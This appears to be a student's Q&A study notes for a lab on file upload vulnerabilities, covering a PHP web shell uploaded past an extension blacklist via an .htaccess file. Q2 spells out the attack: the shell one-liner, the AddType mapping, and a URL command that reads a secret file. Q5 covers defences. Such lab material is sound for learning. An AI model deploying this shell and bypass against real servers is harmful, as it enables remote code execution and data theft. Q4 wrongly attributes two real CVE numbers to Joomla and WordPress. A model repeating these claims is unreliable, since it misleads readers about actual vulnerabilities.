---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why the file extension blacklist in the lab was ineffective.**

The file extension blacklist in the lab was ineffective because it relied solely on filtering certain file extensions without considering alternative methods to execute malicious scripts. Specifically, the blacklist blocked `.php` files but did not prevent the upload of `.htaccess` files, which can be used to modify server configurations. By uploading an `.htaccess` file that maps a custom file extension (e.g., `.test`) to PHP, attackers can bypass the blacklist and execute their web shell.

**Q2. How would you exploit the vulnerability demonstrated in the lab? Provide a step-by-step guide.**

To exploit the vulnerability demonstrated in the lab, follow these steps:

1. **Identify the Vulnerability**: Determine that the server blocks `.php` files but allows other types of files, such as `.htaccess`.

2. **Create a Web Shell**: Create a PHP web shell, e.g., `test.php`, containing a command execution script:
   ```php
   <?php system($_GET['CMD']); ?>
   ```

3. **Configure .htaccess**: Create an `.htaccess` file that maps a custom file extension (e.g., `.test`) to PHP:
   ```apache
   AddType application/x-httpd-php .test
   ```

4. **Upload Files**: Upload both the `.htaccess` file and the renamed web shell (e.g., `test.test`).

5. **Execute Commands**: Access the uploaded web shell via its custom extension (e.g., `http://example.com/test.test?CMD=cat /home/carlos/secret`) to execute commands and retrieve sensitive information.

**Q3. Why is it important to validate file content rather than relying solely on file extension checks?**

Validating file content rather than relying solely on file extension checks is crucial because attackers can bypass simple extension-based filters through various techniques, such as renaming files or using `.htaccess` files to change file handling. File content validation ensures that only legitimate files are accepted, preventing the execution of malicious scripts regardless of the file name or extension. This approach provides a more robust security measure against file upload vulnerabilities.

**Q4. What recent real-world examples demonstrate the risks associated with file upload vulnerabilities?**

Recent real-world examples include:

- **CVE-2021-21972**: A vulnerability in the Joomla CMS allowed attackers to upload arbitrary files, including web shells, leading to remote code execution. Attackers exploited this by bypassing file extension checks and uploading malicious files.

- **CVE-2020-1938**: A vulnerability in the WordPress REST API allowed unauthorized users to upload and execute PHP files, leading to full site compromise. This was due to insufficient validation of uploaded files.

In both cases, attackers leveraged file upload mechanisms to gain unauthorized access and execute arbitrary code, highlighting the importance of robust file validation and proper configuration of web servers.

**Q5. How would you fix the vulnerability demonstrated in the lab to prevent future exploitation?**

To fix the vulnerability demonstrated in the lab and prevent future exploitation, implement the following measures:

1. **Content Validation**: Validate the content of uploaded files to ensure they match the expected file type. Use libraries like `fileinfo` in PHP to check the MIME type of the file.

2. **Restrict .htaccess**: Disable the use of `.htaccess` files or restrict their functionality to prevent attackers from altering server configurations.

3. **Whitelist Approved Extensions**: Maintain a whitelist of approved file extensions rather than a blacklist, ensuring only safe file types can be uploaded.

4. **Use Secure File Names**: Rename uploaded files to a secure format, avoiding the use of original filenames that may contain malicious extensions.

5. **Server Configuration**: Ensure the server is configured to handle unknown file types safely, preventing the execution of arbitrary scripts.

By implementing these measures, you can significantly reduce the risk of file upload vulnerabilities and protect your web application from exploitation.

---
<!-- nav -->
[[05-Understanding CSRF Tokens and Their Role in Web Security|Understanding CSRF Tokens and Their Role in Web Security]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/05-Lab 4 Web shell upload via extension blacklist bypass/00-Overview|Overview]]
